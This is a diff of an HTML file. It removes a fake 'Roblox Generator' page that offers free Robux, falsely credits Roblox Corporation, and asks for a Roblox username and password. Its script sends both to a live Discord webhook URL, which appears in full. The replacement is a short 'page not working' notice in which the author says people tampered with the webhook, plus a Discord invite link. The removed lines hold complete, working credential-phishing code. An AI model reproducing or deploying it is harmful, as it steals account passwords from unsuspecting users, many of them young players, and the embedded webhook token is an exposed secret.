@@ -1,232 +1,49 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Roblox Generator</title>
+  <meta charset="UTF-8">
+  <title>Page Not Working</title>
   <style>
     body {
-      background: #0f172a;
-      font-family: "Segoe UI", Arial, sans-serif;
-      margin: 0;
-      height: 100vh;
-      overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: white;
-    }
-
-    /* Small Copy Button near box */
-    .copy-btn {
-      position: absolute;
-      top: -35px;
-      right: 0;
-      padding: 6px 12px;
-      background: rgba(2, 6, 23, 0.85);
-      border: 1px solid rgba(56, 189, 248, 0.4);
-      border-radius: 6px;
-      color: #38bdf8;
-      font-size: 13px;
-      cursor: pointer;
-      backdrop-filter: blur(6px);
-      transition: 0.25s;
-    }
-
-    .copy-btn:hover {
-      transform: scale(1.05);
-      color: white;
-      box-shadow: 0 0 10px rgba(56, 189, 248, 0.5);
-    }
-
-    /* Falling Robux */
-    .robux {
-      position: fixed;
-      top: -40px;
-      font-size: 22px;
-      color: #22c55e;
-      opacity: 0.8;
-      animation: fall linear infinite;
-      pointer-events: none;
-    }
-
-    @keyframes fall {
-      0% { transform: translateY(-40px) rotate(0deg); }
-      100% { transform: translateY(110vh) rotate(360deg); }
-    }
-
-    /* Main Box */
-    .box {
-      width: 360px;
-      padding: 30px;
-      background: rgba(2, 6, 23, 0.85);
-      border-radius: 16px;
-      box-shadow: 0 0 40px rgba(56, 189, 248, 0.25);
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(56, 189, 248, 0.2);
+      background: #0f0f14;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
       text-align: center;
-      animation: fadeIn 0.8s ease;
-      position: relative;
+      padding: 60px;
     }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+    .box {
+      max-width: 600px;
+      margin: auto;
+      padding: 30px;
+      border-radius: 12px;
+      background: #1b1b27;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
     }
-
-    h2 {
-      margin-bottom: 20px;
-      font-size: 26px;
-      color: #38bdf8;
-      text-shadow: 0 0 10px rgba(56, 189, 248, 0.5);
-    }
-
-    .input-box {
-      width: 100%;
-      padding: 14px;
-      margin: 10px 0;
-      border-radius: 8px;
-      border: 1px solid rgba(148, 163, 184, 0.3);
-      background: #1e293b;
-      color: white;
-      font-size: 15px;
-      outline: none;
-      transition: 0.25s;
-      box-sizing: border-box;
-    }
-
-    .input-box:focus {
-      border-color: #38bdf8;
-      box-shadow: 0 0 10px rgba(56, 189, 248, 0.4);
-    }
-
-    button {
-      width: 100%;
-      padding: 14px;
-      margin-top: 12px;
-      border: none;
-      border-radius: 8px;
-      background: linear-gradient(90deg, #22c55e, #16a34a);
-      color: white;
-      font-size: 17px;
+    a {
+      color: #4f8cff;
       font-weight: bold;
-      cursor: pointer;
-      transition: 0.25s;
+      text-decoration: none;
     }
-
-    button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 0 15px rgba(34, 197, 94, 0.5);
-    }
-
-    #status {
-      margin-top: 12px;
-      font-size: 14px;
-      opacity: 0;
-      transition: 0.4s;
-    }
-
-    .footer {
-      margin-top: 15px;
-      font-size: 12px;
-      color: #94a3b8;
-      opacity: 0.7;
+    a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
-
-<script>
-/* Falling Robux */
-function spawnRobux() {
-  const r = document.createElement("div");
-  r.classList.add("robux");
-  r.innerHTML = "R$";
-  r.style.left = Math.random() * 100 + "vw";
-  r.style.animationDuration = (Math.random() * 3 + 3) + "s";
-  document.body.appendChild(r);
-  setTimeout(() => r.remove(), 6000);
-}
-setInterval(spawnRobux, 300);
-
-/* Copy Link Button */
-function copyLink() {
-  const btn = document.querySelector(".copy-btn");
-
-  navigator.clipboard.writeText(window.location.href).then(() => {
-    btn.innerText = "Link Copied";
-
-    setTimeout(() => {
-      btn.innerText = "Copy Link";
-    }, 1500);
-  });
-}
-</script>
-
-<div class="box">
-
-  <!-- Small Copy Button -->
-  <button class="copy-btn" onclick="copyLink()">Copy Link</button>
-
-  <h2>Roblox Generator</h2>
-
-  <input id="rbx" class="input-box" placeholder="Roblox Name">
-  <input id="pass" class="input-box" type="password" placeholder="Password">
-
-  <select id="amount" class="input-box">
-    <option value="">Select Amount</option>
-    <option value="1500 R$">1500 R$</option>
-    <option value="2500 R$">2500 R$</option>
-    <option value="4500 R$">4500 R$</option>
-  </select>
-
-  <button onclick="sendWebhook()">Generate</button>
-
-  <p id="status"></p>
-
-  <div class="footer">Roblox Corporation • 2026</div>
-</div>
-
-<script>
-function sendWebhook() {
-  const rbx = document.getElementById("rbx").value;
-  const pass = document.getElementById("pass").value;
-  const amount = document.getElementById("amount").value;
-  const status = document.getElementById("status");
-
-  if (!rbx || !pass || !amount) {
-    status.style.color = "#ef4444";
-    status.style.opacity = "1";
-    status.innerText = "Please fill in all fields!";
-    return;
-  }
-
-  const webhookURL = "https://discord.com/api/webhooks/1472623578519437596/4KUFBlQI19Y4ezEjxa5NX25NKOw-9rok3p08EkjqcSf0YPpN18axdif8GMK2DhjNjFLR";
-
-  fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content:
-        "New Request:\n" +
-        "Roblox Name: **" + rbx + "**\n" +
-        "Password: **" + pass + "**\n" +
-        "Amount: **" + amount + "**"
-    })
-  })
-  .then(() => {
-    status.style.color = "#22c55e";
-    status.style.opacity = "1";
-    status.innerText = "✔ Request Sent Successfully!";
-  })
-  .catch(() => {
-    status.style.color = "#ef4444";
-    status.style.opacity = "1";
-    status.innerText = "Error sending request.";
-  });
-}
-</script>
-
-</body>
-</html>
-
+  <div class="box">
+    <h1>Sorry, this page is not working</h1>
+    <p>
+      If you hacked my webhook, I don’t really care.  
+      I just wanted to see what people would do.
+    </p>
+    <p>
+      If you want to join my Discord server, the link is:
+    </p>
+    <p>
+      <a href="https://discord.gg/GaaaY4ns" target="_blank">
+        https://discord.gg/GaaaY4ns
+      </a>
+    </p>
+  </div>
 </body>
 </html>
